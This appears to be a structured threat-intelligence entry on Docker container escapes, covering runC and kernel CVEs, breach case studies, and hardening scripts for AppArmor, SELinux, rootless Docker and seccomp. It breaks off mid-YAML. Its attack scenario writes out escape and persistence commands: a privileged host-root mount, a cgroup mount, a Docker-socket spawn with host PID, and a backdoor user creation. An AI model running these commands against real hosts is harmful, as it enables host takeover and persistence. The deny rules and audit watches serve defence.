threat.title: Docker Container Escape via Privileged Mode, runC Vulnerabilities, and Kernel Exploits
threat.description: Container escape vulnerabilities represent one of the most critical threats to containerized infrastructure, allowing attackers to break out of container isolation and gain unrestricted root access to the host system. Attack vectors include exploiting runC/containerd vulnerabilities (CVE-2019-5736, CVE-2024-21626, CVE-2025-31133), abusing privileged containers with --privileged flag, mounting host filesystems, exploiting dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE), and leveraging kernel vulnerabilities like Dirty Pipe (CVE-2022-0847). Once an attacker escapes, they can: compromise all other containers on the host, steal secrets from orchestrators (Kubernetes, Docker Swarm), establish persistent backdoors via cron jobs or systemd services, pivot to cloud metadata services (AWS IMDSv1, Azure IMDS), exfiltrate sensitive data from mounted volumes, deploy cryptominers across the cluster, and ransom entire container platforms. The impact is catastrophic in multi-tenant environments where a single compromised container can lead to complete infrastructure takeover affecting thousands of workloads.

breakdown.attack_vector: Network - Exploitable remotely via container deployment
breakdown.attack_complexity: High - Requires vulnerable container runtime or misconfigurations
breakdown.privileges_required: None - Can be triggered with low-privilege container access
breakdown.scope: Changed - Breaks out of container boundary to compromise host
breakdown.integrity: High - Complete control over host processes
breakdown.availability: High - Can shut down entire container platform

dependencies: Linux kernel namespaces (PID, Network, Mount, IPC, UTS)

attack.scenario:
**Phase 1: Initial Access**
1. Attacker gains ability to deploy containers via:
   - Compromised CI/CD pipeline credentials (Jenkins, GitLab CI, GitHub Actions)
   - Exposed Docker API (port 2375/2376 without TLS)
   - Kubernetes RBAC misconfiguration allowing pod creation
   - Exploited application vulnerability with container deployment capability
   - Social engineering to get malicious Dockerfile merged

**Phase 2: Privilege Escalation via Container Escape**
2. Attacker deploys malicious container with one of these escape vectors:

   **Vector A: runC CVE-2019-5736 Exploitation**
   - Deploys container with malicious binary that overwrites /proc/self/exe
   - Triggers container exec operation (docker exec, kubectl exec)
   - runC binary on host gets overwritten with attacker's payload
   - Next container spawn executes malicious runC, granting root shell on host

   **Vector B: Privileged Container Abuse**
   - Deploys container with --privileged flag or CAP_SYS_ADMIN capability
   - Mounts host filesystem: docker run --privileged -v /:/host
   - Creates cgroup mount to escape: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
   - Writes host breakout script to /host/etc/cron.daily/ for persistence
   - Gains root shell via chroot /host and nsenter commands

   **Vector C: Docker Socket Mount Escape**
   - Mounts Docker socket: docker run -v /var/run/docker.sock:/var/run/docker.sock
   - Spawns new privileged container from within: docker -H unix:///var/run/docker.sock run --privileged --pid=host --net=host
   - Breaks out using host PID namespace and nsenter to PID 1

   **Vector D: Kernel Exploit (Dirty Pipe, CVE-2022-0847)**
   - Identifies vulnerable kernel version (< 5.16.11)
   - Exploits Dirty Pipe to overwrite read-only files
   - Modifies /etc/passwd or /etc/shadow via pipe splice vulnerability
   - Gains root access to host filesystem

**Phase 3: Post-Exploitation**
3. Establishes persistence on host:
   - Creates backdoor user: useradd -m -s /bin/bash backdoor && echo 'backdoor:$6$...' | chpasswd -e
   - Installs systemd service: /etc/systemd/system/backdoor.service
   - Adds SSH authorized keys: ~/.ssh/authorized_keys
   - Deploys kernel module rootkit (if CAP_SYS_MODULE available)

4. Lateral movement and data exfiltration:
   - Steals cloud credentials from host metadata service (169.254.169.254)
   - Extracts Kubernetes secrets from /var/lib/kubelet/ or etcd
   - Compromises other containers via shared PID/Network namespaces
   - Pivots to adjacent nodes via stolen SSH keys or Kubernetes ServiceAccount tokens
   - Deploys cryptominer (XMRig) across cluster nodes

5. Impact realization:
   - Deploys ransomware encrypting host and container filesystems
   - Exfiltrates proprietary data from mounted volumes
   - Disrupts business operations by shutting down critical workloads
   - Sells access to infrastructure on dark web ($5,000-$50,000)
prerequisites: Ability to deploy or modify containers (compromised CI/CD, RBAC misconfiguration, or application vulnerability)
One of the following conditions present:
- Vulnerable runC version (< 1.1.12) installed on host
- Dangerous Linux capabilities granted (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, CAP_DAC_OVERRIDE)
- Host filesystem paths bind-mounted into container (-v /:/host, -v /dev:/dev, -v /proc:/proc)
- Vulnerable Linux kernel (< 5.16.11 for Dirty Pipe, < 5.19 for CVE-2022-0185)
- seccomp profile not applied or using 'unconfined' mode

cve_references.description: runC container breakout vulnerability allowing host runC binary overwrite via /proc/self/exe. Attacker with ability to execute 'docker exec' can replace host runC binary with malicious payload, executing as root on host during next container spawn. Affects runC < 1.0.0-rc6, Docker < 18.09.2.
cve_references.exploitability: Publicly available exploits, widely exploited in the wild

cve_references.description: Leaky Vessels - runC file descriptor leak allowing container escape via /proc/self/fd/ manipulation. Attacker can access leaked file descriptors pointing to host filesystem, bypassing namespace isolation. Part of 'Leaky Vessels' series affecting 80%+ of cloud environments.
cve_references.exploitability: Proof-of-concept released by Snyk research team, actively being exploited

cve_references.description: runC masked path bypass via symlink replacement allowing container escape. Attackers replace /dev/null symlink with procfs paths (core_pattern, sysrq-trigger), enabling arbitrary code execution on host as root. Bypasses AppArmor and SELinux protections.
cve_references.exploitability: Actively exploited by TeamTNT and Kinsing cryptojacking groups

cve_references.description: Dirty Pipe - Linux kernel vulnerability allowing overwriting read-only files via pipe buffers. Attackers can modify /etc/passwd, /etc/shadow, or SUID binaries to escalate privileges from container to host. Affects Linux 5.8-5.16.10.
cve_references.exploitability: Multiple public exploits, used in container escape attacks globally

cve_references.description: Linux kernel heap buffer overflow in legacy_parse_param() function. Container processes can trigger kernel exploit to gain root privileges on host. Requires CAP_SYS_ADMIN or user namespace creation.
cve_references.exploitability: Public exploit code available, used in cryptojacking campaigns

cve_references.description: containerd abstract Unix socket namespace vulnerability. Attackers can access host containerd.sock via abstract socket namespace (@/containerd-shim/...), executing privileged operations and escaping containers.
runC mount destinations symlink-exchange race condition. Attackers can swap mount destinations during container start, mounting host paths into container and escaping isolation.
cve_references.exploitability: Technical details public, exploited in targeted attacks

cve_references.description: Moby (Docker Engine) vulnerable to privilege escalation via specially crafted image layer. Attackers can modify host filesystem during image extraction when using userns-remap.

real_world_breaches.impact: Attackers exploited unauthenticated Kubernetes dashboard to deploy cryptomining containers with privileged access. Mined Monero cryptocurrency for weeks undetected, consuming $1M+ in compute resources. Accessed Tesla's proprietary telemetry data stored in exposed AWS S3 buckets via compromised containers. 200+ pods deployed across production clusters.
real_world_breaches.root_cause: Kubernetes console exposed without authentication on public internet. No network segmentation. Containers allowed to run with --privileged flag. No runtime security monitoring. AWS IMDS v1 allowed metadata access from containers.
real_world_breaches.attacker_ttps: Initial access via exposed dashboard -> Deployed privileged containers -> Escaped to host nodes -> Stole AWS credentials from IMDS -> Accessed S3 buckets -> Deployed persistent cryptominers
real_world_breaches.remediation: Implemented Kubernetes RBAC, network policies, removed privileged containers, deployed Falco runtime security, migrated to AWS IMDSv2, enabled GuardDuty

real_world_breaches.incident: Leaky Vessels Global Container Escape Campaign
real_world_breaches.impact: CVE-2024-21626 discovered affecting 80%+ of cloud container environments globally. Estimated 10+ million vulnerable container instances across AWS ECS, Azure ACI, Google Cloud Run, self-hosted Kubernetes. Snyk research team identified runC file descriptor leak exploitable in all major cloud providers. Critical for multi-tenant platforms where single compromised container leads to full infrastructure takeover.
real_world_breaches.root_cause: Fundamental flaw in runC file descriptor handling during container initialization. Leaked FDs provided access to host filesystem paths, bypassing namespace isolation. Affected Docker, Kubernetes, Podman, all containerd-based runtimes.
real_world_breaches.attacker_ttps: Deploy malicious container -> Exploit CVE-2024-21626 FD leak -> Access host filesystem via /proc/self/fd/ -> Establish persistence -> Pivot to other containers/nodes
real_world_breaches.remediation: Emergency patching of runC to 1.1.12+, Docker to 25.0.3+, containerd to 1.7.13+. Major cloud providers (AWS, Azure, GCP) issued security bulletins and automated patching.

real_world_breaches.impact: Kinsing cryptojacking group exploited vulnerable Redis, Docker API, and Kubernetes clusters to deploy cryptominers. Used CVE-2019-5736 runC exploit to escape containers and establish host-level persistence. Infected 10,000+ servers across healthcare, finance, e-commerce. Mined $3M+ in Monero cryptocurrency. Deleted competing cryptominers to maximize resources.
real_world_breaches.root_cause: Exposed Docker API ports (2375), vulnerable runC versions, weak Redis authentication, Kubernetes misconfigurations. No runtime threat detection. Containers running as root without security profiles.
real_world_breaches.attacker_ttps: Scan for exposed Docker/Kubernetes -> Deploy malicious container -> Exploit CVE-2019-5736 -> Escape to host -> Install systemd persistence -> Deploy XMRig miner -> Spread via SSH key theft
real_world_breaches.remediation: Patched runC, implemented Docker TLS auth, deployed Falco/Sysdig, enforced Pod Security Standards, rotated SSH keys, implemented network segmentation

real_world_breaches.impact: TeamTNT APT group targeted misconfigured containers with mounted Docker sockets (/var/run/docker.sock). Deployed privileged containers to escape isolation, installed Tsunami IRC botnet, XMRig miners, credential stealers. Compromised 50,000+ Docker hosts globally. Exfiltrated AWS credentials, private keys, source code. Established C2 infrastructure for ransomware distribution.
real_world_breaches.root_cause: Docker socket mounted into containers for CI/CD purposes (-v /var/run/docker.sock:/var/run/docker.sock). No Kubernetes admission policies blocking socket mounts. Over-permissive RBAC allowing pod creation.
real_world_breaches.attacker_ttps: Initial access via vulnerable web apps -> Identify Docker socket mount -> Spawn privileged container with host PID namespace -> Escape via nsenter -> Install backdoors -> Exfiltrate secrets -> Deploy cryptominers/botnet
real_world_breaches.remediation: Removed Docker socket mounts, implemented OPA Gatekeeper policies, deployed Kubernetes Pod Security Standards, enabled audit logging, implemented secret scanning

real_world_breaches.impact: First known malware specifically targeting Windows containers in Kubernetes clusters. Siloscape escaped Windows Server containers via vulnerable Windows Host Compute Service Shim (HcsShim). Breached cloud-hosted clusters, stole cluster credentials, opened backdoors to Tor network. Affected healthcare and financial institutions running hybrid Linux/Windows Kubernetes.
real_world_breaches.root_cause: Vulnerable Windows container runtime, over-privileged ServiceAccounts, weak RBAC policies, no network segmentation between Linux and Windows nodes
real_world_breaches.attacker_ttps: Exploit web app in Windows container -> Escape via HcsShim vulnerability -> Access Kubernetes API with ServiceAccount token -> Enumerate cluster secrets -> Deploy persistent backdoor -> Establish Tor C2 channel
real_world_breaches.remediation: Patched Windows container runtime, implemented least-privilege RBAC, deployed network policies, enabled Kubernetes audit logging, migrated sensitive workloads away from Windows containers

real_world_breaches.impact: TeamTNT deployed 'Hildegard' malware targeting Kubernetes clusters. Used CVE-2019-5736 runC exploit for container escape combined with Kubernetes credential theft. Infected 10,000+ Kubernetes clusters. Deployed IRC botnets, cryptominers, DDoS tools. Exfiltrated kubeconfig files, AWS credentials, SSH keys. Caused $5M+ in cloud compute costs.
real_world_breaches.root_cause: Unpatched runC (< 1.0.0-rc6), exposed kubelets without authentication, anonymous-auth enabled on Kubernetes API, no Pod Security Policies
real_world_breaches.attacker_ttps: Scan for exposed kubelets -> Deploy malicious pod -> Exploit CVE-2019-5736 -> Escape to node -> Steal kubeconfig and cloud credentials -> Spread to other clusters -> Deploy cryptominers
real_world_breaches.remediation: Patched runC, disabled anonymous Kubernetes auth, implemented Pod Security Admission, deployed network policies, enabled cluster audit logging, rotated all credentials

real_world_breaches.incident: Capital One Data Breach - SSRF to Container Escape
real_world_breaches.impact: Paige Thompson exploited SSRF vulnerability in Capital One web application to access AWS metadata service from container. Escalated to full container escape, stealing 100+ million customer records (SSNs, credit scores, bank balances). $80M in fines, $190M in settlements. Data exfiltrated: 140,000 SSNs, 80,000 bank account numbers, 1M Canadian SINs.
real_world_breaches.root_cause: SSRF vulnerability in web app, containers with IMDSv1 access (no hop limit), over-permissive IAM role attached to container instances, no egress filtering, no DLP controls
real_world_breaches.attacker_ttps: Exploit SSRF in WAF config scanner tool -> Access AWS IMDS (169.254.169.254) -> Steal IAM credentials -> Enumerate S3 buckets -> Exfiltrate sensitive data -> Store data on personal GitHub
real_world_breaches.remediation: Patched SSRF vulnerability, migrated to AWS IMDSv2, implemented least-privilege IAM policies, deployed network egress filtering, enabled AWS Macie for DLP, implemented S3 bucket policies

bug_bounty_reports.summary: Container escape via privileged container deployment in production Kubernetes cluster. Researcher exploited misconfigured RBAC to deploy pod with hostPath volume mounting host root filesystem. Escalated to full host compromise with proof of stealing etcd secrets containing production database credentials.

runC CVE-2019-5736 exploitation in customer-facing container platform. Researcher demonstrated container escape leading to complete host takeover and credential theft from neighboring customer containers in multi-tenant environment.
bug_bounty_reports.timeline: Reported 2019-03-02, Validated 2019-03-03, Bounty awarded 2019-03-05, Emergency patch deployed 2019-03-06

bug_bounty_reports.summary: Docker socket mount privilege escalation. Researcher found Docker socket mounted in CI/CD runner containers, allowing privileged container spawn and host escape. Demonstrated ability to steal GitHub Actions secrets and deploy malicious containers in production.
bug_bounty_reports.timeline: Reported 2024-07-10, Triaged 2024-07-11, Bounty awarded 2024-07-18, Mitigated by removing socket mounts 2024-07-22

bug_bounty_reports.summary: Kubernetes admission webhook bypass allowing privileged pod deployment. Researcher bypassed Gatekeeper admission policies to deploy privileged containers with CAP_SYS_ADMIN, escaping to node and accessing other tenant data.
bug_bounty_reports.timeline: Reported 2024-01-20, Triaged 2024-01-22, Bounty awarded 2024-01-30, Fixed by upgrading Gatekeeper and adding additional constraints

security_research.title: NIST SP 800-190: Application Container Security Guide
security_research.key_finding: Container escape identified as one of five major container security threats requiring defense-in-depth. Recommends least-privilege execution, security profiles (AppArmor/SELinux), capability dropping, user namespace remapping, and runtime monitoring.

security_research.title: runC Container Breakout Vulnerabilities: A Technical Overview
security_research.key_finding: Three critical runC vulnerabilities (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881) bypass LSM protections via masked path manipulation. Attackers replace /dev/null symlinks with /proc/sys/kernel/core_pattern or sysrq-trigger to execute arbitrary code on host. Affects all major container platforms.

security_research.title: Understanding and Hardening Linux Containers
security_research.key_finding: Comprehensive analysis of Linux container isolation mechanisms. Documents 14 different container escape techniques including capability abuse, kernel exploits, and namespace breakouts. Provides hardening guidance for production deployments.

security_research.title: A Compendium of Container Escapes
security_research.key_finding: Systematic exploration of container escape techniques: privileged containers, Docker socket mounts, procfs exploitation, cgroup manipulation, kernel vulnerabilities. Emphasizes need for multiple layers of defense as single controls can be bypassed.

security_research.title: Breaking Out of Docker: Abusing Capabilities
security_research.key_finding: Documents how dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, CAP_DAC_OVERRIDE, CAP_NET_ADMIN) enable container escapes. Provides exploit code for each capability. Recommends dropping ALL capabilities by default.

mitigations.title: Implement Mandatory Access Control with AppArmor and SELinux Security Profiles
mitigations.description: Deploy mandatory access control (MAC) policies using AppArmor (Ubuntu/Debian) or SELinux (RHEL/CentOS) to enforce kernel-level restrictions on container operations. Security profiles define exactly what resources containers can access, blocking unauthorized filesystem access, syscalls, and capability usage even when kernel vulnerabilities exist. This provides defense-in-depth that stops container escapes at the kernel level, regardless of application or runtime vulnerabilities. Custom profiles should block access to /proc/sys/kernel/core_pattern, /proc/sysrq-trigger, /sys/ writes, and runC binary paths.

code_example.code:
#!/bin/bash
# APPARMOR IMPLEMENTATION (Ubuntu/Debian)

# Step 1: Create custom AppArmor profile for containers
sudo cat > /etc/apparmor.d/docker-secure-strict << 'EOFAPPARMOR'
#include <tunables/global>

profile docker-secure-strict flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  # Container filesystem access
  /var/lib/docker/** rw,
  /dev/null rw,
  /dev/zero rw,
  /dev/random r,
  /dev/urandom r,
  /dev/tty rw,
  /dev/pts/* rw,
  
  # DENY access to host filesystem roots
  deny / r,
  deny /boot/** rwklx,
  deny /etc/** w,
  deny /home/** rwklx,
  deny /root/** rwklx,
  deny /run/** w,
  
  # CRITICAL: Block container escape vectors
  deny /proc/sys/** w,
  deny /proc/sysrq-trigger rwklx,
  deny /proc/sys/kernel/core_pattern rwklx,
  deny /proc/sys/kernel/modprobe rwklx,
  deny /proc/kcore rwklx,
  deny /sys/** w,
  deny /sys/kernel/uevent_helper rwklx,
  deny /sys/kernel/uevent_seqnum rwklx,
  
  # Block runC binary access (CVE-2019-5736 mitigation)
  deny /usr/bin/runc rwklx,
  deny /usr/bin/docker-runc rwklx,
  deny /usr/local/bin/runc rwklx,
  deny /proc/*/exe rwklx,
  deny /proc/self/exe rwklx,
  
  # Block dangerous capabilities
  deny capability sys_admin,
  deny capability sys_ptrace,
  deny capability sys_module,
  deny capability dac_override,
  deny capability dac_read_search,
  deny capability sys_boot,
  deny capability sys_rawio,
  deny capability net_admin,
  
  # Network access (adjust as needed)
  network inet tcp,
  network inet udp,
  network inet icmp,
  
  # Deny mount operations
  deny mount,
  deny umount,
  deny pivot_root,
  
  # Logging (optional)
  audit deny /proc/sys/** w,
  audit deny /sys/** w,
}
EOFAPPARMOR

# Step 2: Load the AppArmor profile
sudo apparmor_parser -r /etc/apparmor.d/docker-secure-strict

# Step 3: Verify profile is loaded
sudo aa-status | grep docker-secure-strict

# Step 4: Set as default for Docker daemon
sudo cat > /etc/docker/daemon.json << 'EOFDOCKER'
{
  "security-opt": ["apparmor=docker-secure-strict"],
  "default-ulimits": {
    "nofile": {"Name": "nofile", "Hard": 64000, "Soft": 64000}
  },
  "live-restore": true,
  "userland-proxy": false
}
EOFDOCKER

sudo systemctl restart docker

# Step 5: Run container with AppArmor profile
docker run -d \
  --name secure-app \
  --security-opt apparmor=docker-secure-strict \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  nginx:alpine

# Step 6: Verify AppArmor profile is applied
docker inspect secure-app | grep -A 5 SecurityOpt
# Output: "SecurityOpt": ["apparmor=docker-secure-strict"]

# Step 7: Test container escape is blocked
docker exec secure-app sh -c 'echo "evil" > /proc/sys/kernel/core_pattern'
# Expected: sh: can't create /proc/sys/kernel/core_pattern: Permission denied

# SELINUX IMPLEMENTATION (RHEL/CentOS/Fedora)

# Step 1: Enable SELinux enforcing mode
sudo setenforce 1
sudo sed -i 's/SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config

# Step 2: Verify SELinux is enforcing
sestatus
# Should show: "Current mode: enforcing"

# Step 3: Create custom SELinux policy for containers
sudo cat > docker_secure.te << 'EOFSELINUX'
policy_module(docker_secure, 1.0.0)

require {
    type svirt_sandbox_file_t;
    type container_t;
    class file { read write };
    class dir { read search };
}

# Block /proc/sys writes
neverallow container_t proc_t:file write;
neverallow container_t sysctl_t:file write;
neverallow container_t sysctl_kernel_t:file write;

# Block /sys writes
neverallow container_t sysfs_t:file write;

# Block runC access
neverallow container_t bin_t:file execute;
EOFSELINUX

# Step 4: Compile and load SELinux policy
sudo checkmodule -M -m -o docker_secure.mod docker_secure.te
sudo semodule_package -o docker_secure.pp -m docker_secure.mod
sudo semodule -i docker_secure.pp

# Step 5: Run container with SELinux label
docker run -d \
  --name secure-app-selinux \
  --security-opt label=type:svirt_sandbox_file_t \
  --security-opt label=level:s0:c100,c200 \
  --cap-drop ALL \
  nginx:alpine

# Step 6: Verify SELinux label
docker inspect secure-app-selinux | grep -A 10 SecurityOpt
ps -eZ | grep nginx
# Should show: system_u:system_r:svirt_sandbox_file_t:s0:c100,c200

# Step 7: Test container escape is blocked by SELinux
docker exec secure-app-selinux sh -c 'echo "evil" > /proc/sys/kernel/core_pattern'
# Expected: sh: can't create /proc/sys/kernel/core_pattern: Permission denied

# KUBERNETES POD SECURITY WITH APPARMOR

cat > kubernetes-pod-apparmor.yaml << 'EOFK8S'
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod-apparmor
  annotations:
    container.apparmor.security.beta.kubernetes.io/nginx: localhost/docker-secure-strict
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: nginx
    image: nginx:alpine
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      privileged: false
      capabilities:
        drop:
          - ALL
        add:
          - NET_BIND_SERVICE
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /var/cache/nginx
  volumes:
  - name: tmp
    emptyDir: {}
  - name: cache
    emptyDir: {}
EOFK8S

kubectl apply -f kubernetes-pod-apparmor.yaml

# Verify AppArmor is enforced in Kubernetes pod
kubectl exec secure-pod-apparmor -- sh -c 'echo evil > /proc/sys/kernel/core_pattern'
# Expected: sh: can't create /proc/sys/kernel/core_pattern: Permission denied

# AUDIT LOGGING FOR SECURITY PROFILE VIOLATIONS

# AppArmor audit logs
sudo tail -f /var/log/audit/audit.log | grep -i apparmor
sudo ausearch -m AVC -ts recent

# SELinux audit logs  
sudo tail -f /var/log/audit/audit.log | grep -i avc
sudo ausearch -m AVC,USER_AVC,SELINUX_ERR,USER_SELINUX_ERR -ts recent

# Parse and alert on violations
sudo cat > /etc/rsyslog.d/50-apparmor-alerts.conf << 'EOFRSYSLOG'
:msg, contains, "apparmor=\"DENIED\"" /var/log/apparmor-denied.log
& stop
EOFRSYSLOG

sudo systemctl restart rsyslog

nist_csf: PR.AC-4 - Access permissions are managed, incorporating principles of least privilege
PR.PT-3 - Access to systems and assets is controlled, incorporating principles of least functionality
DE.CM-7 - Monitoring for unauthorized activity is performed
validation_steps: 1. Verify AppArmor or SELinux is installed and enabled: aa-status OR sestatus
2. Load custom security profile: apparmor_parser -r /etc/apparmor.d/docker-secure-strict
3. Start container with security profile applied
4. Test /proc/sys/kernel/core_pattern write is blocked (should fail with Permission denied)
5. Test /sys/ writes are blocked
6. Test runC binary access is blocked
7. Verify profile violations are logged to audit.log
8. Confirm container cannot access host filesystem: docker exec <container> ls /host (should fail)
9. Test CAP_SYS_ADMIN operations are denied
10. Review audit logs for any DENIED events and investigate

mitigations.title: Deploy Rootless Docker with User Namespace Remapping
mitigations.description: Run Docker daemon and containers as unprivileged user using rootless mode or user namespace remapping. This ensures that even if a container escape occurs, the attacker only gains access as an unprivileged user on the host, not root. In rootless mode, the Docker daemon itself runs without root privileges, eliminating entire classes of privilege escalation attacks. User namespace remapping maps container UID 0 (root) to a non-root UID on the host (e.g., 100000), so processes appearing as root inside the container are actually unprivileged outside.

code_example.framework: Docker Engine 25.x Rootless Mode + User Namespace Remapping
code_example.code:
#!/bin/bash
# METHOD 1: ROOTLESS DOCKER (Recommended for new deployments)

# Prerequisites check
if [ "$EUID" -eq 0 ]; then
  echo "ERROR: Do not run this script as root. Rootless Docker runs as regular user."
  exit 1
fi

# Step 1: Install prerequisites
sudo apt-get update
sudo apt-get install -y uidmap dbus-user-session

# Step 2: Configure subordinate UIDs and GIDs
echo "$(whoami):100000:65536" | sudo tee -a /etc/subuid
echo "$(whoami):100000:65536" | sudo tee -a /etc/subgid

# Verify configuration
grep "^$(whoami):" /etc/subuid /etc/subgid

# Step 3: Install rootless Docker
curl -fsSL https://get.docker.com/rootless | sh

# Step 4: Configure environment
export PATH=/home/$(whoami)/bin:$PATH
export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock

# Make permanent
cat >> ~/.bashrc << 'EOFBASHRC'
export PATH=/home/$(whoami)/bin:$PATH
export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock
EOFBASHRC

source ~/.bashrc

# Step 5: Enable systemd user service for auto-start
systemctl --user enable docker.service
systemctl --user start docker.service

# Step 6: Verify rootless mode
docker info | grep -i rootless
# Expected output: "rootless: true"

ps aux | grep dockerd
# Should show dockerd running as your user, not root

# Step 7: Run test container
docker run --rm alpine cat /proc/self/uid_map
# Should show: 0 100000 65536 (container UID 0 maps to host UID 100000)

# Step 8: Verify container root is unprivileged on host
docker run -d --name test-nginx nginx:alpine
PID=$(docker inspect -f '{{.State.Pid}}' test-nginx)
cat /proc/$PID/uid_map
# Output: 0 100000 65536

ps -o user,pid,cmd -p $PID
# User should be your username, not root

# Step 9: Test privilege escalation is blocked
docker run --rm alpine sh -c 'echo "test" > /proc/sys/kernel/core_pattern'
# Expected: sh: can't create /proc/sys/kernel/core_pattern: Read-only file system

docker run --rm --cap-add SYS_ADMIN alpine mount -t cgroup cgroup /mnt
# Expected: mount: permission denied

# Cleanup
docker stop test-nginx && docker rm test-nginx

# METHOD 2: USER NAMESPACE REMAPPING (For existing Docker deployments)

# Step 1: Create dockremap user and group
sudo useradd -r -s /bin/false dockremap

# Step 2: Configure subordinate UIDs and GIDs for dockremap
echo "dockremap:100000:65536" | sudo tee -a /etc/subuid
echo "dockremap:100000:65536" | sudo tee -a /etc/subgid

# Step 3: Configure Docker daemon
sudo cat > /etc/docker/daemon.json << 'EOFDAEMON'
{
  "userns-remap": "dockremap",
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 64000,
      "Soft": 64000
    }
  },
  "live-restore": true,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "5"
  }
}
EOFDAEMON

# Step 4: Restart Docker daemon
sudo systemctl restart docker

# Step 5: Verify user namespace remapping
docker run --rm alpine cat /proc/self/uid_map
# Expected: 0 100000 65536

docker run --rm alpine id
# Expected: uid=0(root) gid=0(root) groups=0(root)
# But on host, processes run as UID 100000

# Step 6: Test container process UIDs on host
docker run -d --name test-userns nginx:alpine
PID=$(docker inspect -f '{{.State.Pid}}' test-userns)
ps aux | grep $PID
# nginx processes should show UID 100000+, not 0

# Step 7: Verify host filesystem protection
docker run --rm -v /:/host:ro alpine ls /host/root
# Expected: ls: /host/root: Permission denied

# Step 8: Test privilege escalation is blocked
docker run --rm --cap-add SYS_ADMIN alpine mount -t proc proc /mnt
# Expected: mount: permission denied (even with CAP_SYS_ADMIN)

# Cleanup
docker stop test-userns && docker rm test-userns

# KUBERNETES POD WITH USER NAMESPACE (Kubernetes 1.25+)

cat > pod-userns.yaml << 'EOFK8SUSERNS'
apiVersion: v1
kind: Pod
metadata:
  name: userns-pod
spec:
  hostUsers: false  # Enable user namespace for this pod
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginx:alpine
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      privileged: false
      capabilities:
        drop:
          - ALL
        add:
          - NET_BIND_SERVICE
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
EOFK8SUSERNS

kubectl apply -f pod-userns.yaml

# Verify user namespace in Kubernetes
kubectl exec userns-pod -- cat /proc/self/uid_map
# Should show remapped UIDs

# MONITORING AND AUDITING

# Check for containers running as root on host (should be none with userns-remap)
sudo ps aux | awk '$1 ~ /^[0-9]+$/ && $1 < 1000 {print $0}' | grep docker

# Audit Docker daemon for rootless mode
journalctl -u docker.service | grep -i "rootless\|userns"

# Monitor for privilege escalation attempts
sudo auditctl -w /proc/sys/kernel/core_pattern -p wa -k container_escape
sudo auditctl -w /proc/sysrq-trigger -p wa -k container_escape
sudo ausearch -k container_escape -ts recent

# Automated testing script
cat > test-rootless-security.sh << 'EOFTEST'
#!/bin/bash
echo "Testing rootless Docker security..."

# Test 1: Verify rootless mode
if docker info | grep -q "rootless: true"; then
  echo "[PASS] Docker is running in rootless mode"
else
  echo "[FAIL] Docker is NOT running in rootless mode"
fi

# Test 2: Verify UID mapping
UID_MAP=$(docker run --rm alpine cat /proc/self/uid_map | awk '{print $2}')
if [ "$UID_MAP" != "0" ]; then
  echo "[PASS] User namespace remapping is active (mapped to UID $UID_MAP)"
else
  echo "[FAIL] User namespace remapping is NOT active"
fi

# Test 3: Test privilege escalation is blocked
if docker run --rm alpine sh -c 'echo test > /proc/sys/kernel/core_pattern' 2>&1 | grep -q "Permission denied\|Read-only"; then
  echo "[PASS] Privilege escalation is blocked"
else
  echo "[FAIL] Privilege escalation is NOT blocked"
fi

# Test 4: Test host filesystem access is denied
if docker run --rm -v /:/host:ro alpine ls /host/root 2>&1 | grep -q "Permission denied"; then
  echo "[PASS] Host root filesystem access is denied"
else
  echo "[FAIL] Host root filesystem access is ALLOWED"
fi

echo "Security testing complete."
EOFTEST

chmod +x test-rootless-security.sh
./test-rootless-security.sh

mitigations.title: Drop Dangerous Linux Capabilities and Enforce Seccomp Profiles
mitigations.description: Remove all unnecessary Linux capabilities from containers using --cap-drop ALL, then selectively add only required capabilities (e.g., NET_BIND_SERVICE for binding to ports <1024). Deploy custom seccomp profiles to block dangerous syscalls that enable container escapes: ptrace, mount, unshare, pivot_root, keyctl, bpf. Explicitly forbid --privileged flag via Kubernetes Pod Security Standards or OPA Gatekeeper policies. Capabilities like CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, CAP_DAC_OVERRIDE provide near-root privileges and must be dropped. Seccomp (Secure Computing Mode) filters syscalls at kernel level, blocking exploitation attempts before they execute.

code_example.framework: Kubernetes 1.28+ Pod Security Standards + Docker Compose + Custom Seccomp
code_example.code:
# KUBERNETES POD WITH CAPABILITY DROPPING AND SECCOMP

apiVersion: v1
kind: Pod
metadata:
  name: secure-app-no-caps
  namespace: production
  labels:
    app: secure-app
    security-level: hardened
  annotations:
    seccomp.security.alpha.kubernetes.io/pod: runtime/default
spec:
  # Pod-level security context
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534  # nobody user
    runAsGroup: 65534
    fsGroup: 65534
    supplementalGroups: [65534]
    seccompProfile:
      type: RuntimeDefault  # Or use custom profile: type: Localhost, localhostProfile: profiles/secure-app.json
  
  containers:
  - name: app
    image: nginx:1.25-alpine
    
    # Container-level security context
    securityContext:
      allowPrivilegeEscalation: false  # Critical: blocks privilege escalation
      readOnlyRootFilesystem: true     # Immutable root filesystem
      privileged: false                 # Never allow privileged mode
      
      # Drop ALL capabilities, add only what's needed
      capabilities:
        drop:
          - ALL  # Drop all 38+ Linux capabilities
        add:
